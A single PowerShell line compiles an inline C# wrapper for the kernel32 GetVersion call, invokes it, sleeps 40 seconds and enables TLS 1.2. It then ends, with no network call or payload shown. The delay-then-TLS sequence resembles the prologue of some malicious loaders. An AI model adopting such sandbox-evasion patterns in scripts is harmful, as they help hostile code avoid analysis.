
$NativeCode = "using System; using System.Runtime.InteropServices; public static class NativeApi { [DllImport(`"kernel32.dll`")] public static extern uint GetVersion(); }"; Add-Type -TypeDefinition $NativeCode -Language CSharp; $ResultObject = [NativeApi]::GetVersion(); Start-Sleep -Seconds 40; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
